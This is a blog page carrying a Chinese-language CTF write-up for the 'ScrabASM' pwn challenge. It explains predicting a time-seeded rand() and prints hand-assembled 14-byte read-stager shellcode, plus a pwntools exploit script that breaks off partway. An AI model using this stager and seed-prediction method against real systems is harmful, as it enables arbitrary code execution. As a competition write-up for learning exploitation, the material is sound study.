<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"whoamiuu.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":true,"height":300},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="Whoamiuu&#39;s Blogs">
<meta property="og:url" content="http://whoamiuu.github.io/index.html">
<meta property="og:site_name" content="Whoamiuu&#39;s Blogs">
<meta property="og:locale" content="en_US">
<meta property="article:tag" content="pwn, ctf, binary, exploit, reverse">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://whoamiuu.github.io/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Whoamiuu's Blogs</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>




  <script src="/js/third-party/fancybox.js" defer></script>



  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Whoamiuu's Blogs</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">二进制安全学习笔记</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="Searching..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt=""
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name"></p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">17</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/02/09/2026-02-09-ScrabASM/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2026/02/09/2026-02-09-ScrabASM/" class="post-title-link" itemprop="url">CTF题解：ScrabASM</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2026-02-09 16:56:00 / Modified: 17:16:28" itemprop="dateCreated datePublished" datetime="2026-02-09T16:56:00+08:00">2026-02-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="ScrabASM"><a href="#ScrabASM" class="headerlink" title="ScrabASM"></a>ScrabASM</h1><h2 id="一、题目分析"><a href="#一、题目分析" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><p>查看程序，发现程序分配了一块固定地址 0x13370000 的可读可写可执行区域，还会执行这里的机器码。第一反应是构造 14 字节的 shellcode，但调试看了一下执行0x13370000时的寄存器状态根本无法构造出一个 14 字节的 shellcode，这是第一个难点。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HAND_SIZE 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOARD_ADDR 0x13370000UL</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *hand)</span> &#123;</span><br><span class="line">    <span class="type">void</span> *board = mmap((<span class="type">void</span> *)BOARD_ADDR, BOARD_SIZE,</span><br><span class="line">                       PROT_READ | PROT_WRITE | PROT_EXEC,</span><br><span class="line">                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (board == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;    mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    Playing your word...&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    TRIPLE WORD SCORE!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(board, hand, HAND_SIZE);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))board)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再看源码，发现程序会调用 rand() 来控制 0x13370000 区域的机器码，虽然可以通过swap再次通过 rand() 生成一个字节，但程序只会输出一次字节序列，就是我们无法知道swap的字节是什么，这是第二个难点。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap_tile</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *hand)</span> &#123;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    Which tile? (0-%d): &quot;</span>, HAND_SIZE - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fgets(line, <span class="keyword">sizeof</span>(line), <span class="built_in">stdin</span>)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> idx = atoi(line);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= HAND_SIZE) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;    Invalid tile!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hand[idx] = rand() &amp; <span class="number">0xFF</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    Tile swapped!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到rand()后，又出现一个想法，就是rand()生成的是伪随机数，由种子决定，能否通过覆盖种子来控制伪随机数生成？但是看遍了源码都没有找到任何有机会溢出的漏洞点。</p>
<h2 id="二、漏洞"><a href="#二、漏洞" class="headerlink" title="二、漏洞"></a>二、漏洞</h2><p>隔了一天再看这道题，既然rand()依靠种子生成伪随机数，而种子通过当前的时间戳生成，srand(time(NULL))以秒为单位，所有只要在同一秒的时间去使用 srand(time(NULL))，生成的种子就相同，说明我们可以利用这一点在本地生成rand()伪随机数，以此推算出程序生成的伪随机数，甚至推算出需要swap多少次可以生成需要的数字。</p>
<p>让ai写个脚本验证一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">BINARY = <span class="string">&quot;./scrabASM&quot;</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class="line">libc.rand.restype = ctypes.c_int</span><br><span class="line"></span><br><span class="line">p = process(BINARY)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.lac.tf&#x27;, 31338)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your starting tiles:\n&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">line = p.recvline().decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取 14 个 hex</span></span><br><span class="line">hexes = re.findall(<span class="string">r&#x27;([0-9a-fA-F]&#123;2&#125;)&#x27;</span>, line)</span><br><span class="line">real = [<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> hexes[:<span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line">seed = <span class="built_in">int</span>(time.time()) <span class="comment"># - 1</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line">pred = [libc.rand() &amp; <span class="number">0xFF</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;真实:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> real))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> pred))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匹配?&quot;</span>, real == pred)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>在 seed &#x3D; int(time.time()) 那里，由于远程可能会有延迟，所以远程时需要 -1 秒。</p>
<p>很完美，本地预测随机数和程序生成的随机数一模一样，说明这个方法完全可行，只要本地生成之后的随机数，就可以反推出每个tile需要swap多少次，第一个困难已经解决。接下来，我们需要考虑这里的shellcode应该如何布置。</p>
<p><img src="/images/26-02-09-scrabASM/test.png" alt="image-20260209162215228"></p>
<p>这里先来看一下执行 0x13370000 时的寄存器状态</p>
<p><img src="/images/26-02-09-scrabASM/register.png" alt="image-20260209163230746"></p>
<p>很明显，这些寄存器状态无法直接构造 14 字节的 shellcode （execve）。但是，仔细查看源码，虽然只限制读入 14 字节的机器码，但是却分配了 0x1000 字节的可读可写可执行区域。思考：对于14字节shellcode，我们无法直接构造execve，那是否可以构造一个read，然后在此区域读取更多字节，给execve的shellcode创造足够的空间？</p>
<p>利用当前寄存器状态，我构造了如下字节序列</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x48</span>, <span class="number">0x87</span>, <span class="number">0xfe</span>,       <span class="comment"># xchg rdi, rsi    ; rsi 已是 0x13370000</span></span><br><span class="line"><span class="number">0x6a</span>, <span class="number">0x00</span>,             <span class="comment"># push 0</span></span><br><span class="line"><span class="number">0x5f</span>,                   <span class="comment"># pop rdi          ; rdi = 0 (stdin)</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>,       <span class="comment"># add rsi, rdx     ; rsi = 0x1337000e (因为 rdx=14)</span></span><br><span class="line"><span class="number">0x5a</span>,                   <span class="comment"># pop rdx          ; rdx = 栈上的大数值</span></span><br><span class="line"><span class="number">0x31</span>, <span class="number">0xc0</span>,             <span class="comment"># xor eax, eax     ; rax = 0 (read)</span></span><br><span class="line"><span class="number">0x0f</span>, <span class="number">0x05</span>              <span class="comment"># syscall          ; read(0, 0x1337000e, 大数值)</span></span><br></pre></td></tr></table></figure>

<p>刚好14字节，这里利用栈上的数据（肯定远远大于14）作为 rdx，构造出一个read(0, 0x1337000e, 大数值)，并且读入的位置刚好时syscall后面，就紧接着执行第二次输入的shellcode（execve），获得shell</p>
<p>思路如上，之后因为需要多次swap，又加了一些自动化swap脚本，然后就可以获得shell。远程连接时如果需要swap的次数太多可能会被服务器给ban了，导致执行到一半就EOF，多打几次应该就行，反正本地挺稳的。我觉得这道题是有难度的，但看解出的人很多，可能我把它想复杂了也不一定。。。</p>
<p><img src="/images/26-02-09-scrabASM/shell.png" alt="image-20260209170155209"></p>
<p>完整exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class="line">libc.rand.restype = ctypes.c_int</span><br><span class="line"></span><br><span class="line">HAND_SIZE = <span class="number">14</span></span><br><span class="line">MAX_SWAP_TRIES = <span class="number">20000</span>   <span class="comment"># 防止死循环，足够大</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./scrabASM&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.lac.tf&#x27;, 31338)</span></span><br><span class="line"></span><br><span class="line">TARGET = [</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x87</span>, <span class="number">0xfe</span>,       <span class="comment"># xchg rdi, rsi    ; rsi 已是 0x13370000</span></span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x00</span>,             <span class="comment"># push 0</span></span><br><span class="line">    <span class="number">0x5f</span>,                   <span class="comment"># pop rdi          ; rdi = 0 (stdin)</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>,       <span class="comment"># add rsi, rdx     ; rsi = 0x1337000e (因为 rdx=14)</span></span><br><span class="line">    <span class="number">0x5a</span>,                   <span class="comment"># pop rdx          ; rdx = 栈上的大数值</span></span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xc0</span>,             <span class="comment"># xor eax, eax     ; rax = 0 (read)</span></span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>              <span class="comment"># syscall          ; read(0, 0x1337000e, 大数值)</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收初始 hand</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your starting tiles:\n&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">line = p.recvline().decode()</span><br><span class="line">hexes = re.findall(<span class="string">r&#x27;([0-9a-fA-F]&#123;2&#125;)&#x27;</span>, line) <span class="comment"># 提取 14 个 hex</span></span><br><span class="line">real = [<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> hexes[:<span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预测种子</span></span><br><span class="line">seed = <span class="built_in">int</span>(time.time())<span class="comment"># - 1</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line">pred = [libc.rand() &amp; <span class="number">0xFF</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;真实:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> real))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> pred))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匹配?&quot;</span>, real == pred)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> real != pred:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;预测与实际不匹配，脚本退出&quot;</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;种子匹配成功！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"><span class="comment"># 匹配成功 → 继续生成后续 rand 序列，并计算 swap 次数</span></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新同步随机数生成器</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(HAND_SIZE):</span><br><span class="line">    libc.rand()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成后续可用的 rand 值（足够多）</span></span><br><span class="line">future_rand = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SWAP_TRIES + <span class="number">100</span>):</span><br><span class="line">    future_rand.append(libc.rand() &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n后续 rand 值已生成（前10个示例）：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> future_rand[:<span class="number">10</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_hand = real[:]              <span class="comment"># 当前 hand 状态</span></span><br><span class="line">swap_counts = [<span class="number">0</span>] * HAND_SIZE       <span class="comment"># 记录每个位置需要 swap 多少次</span></span><br><span class="line">rand_idx = <span class="number">0</span>                        <span class="comment"># 指向 future_rand 的下标</span></span><br><span class="line">unfinished = <span class="built_in">set</span>(<span class="built_in">range</span>(HAND_SIZE))  <span class="comment"># 未完成的 tile</span></span><br><span class="line">execution_order = []                <span class="comment"># 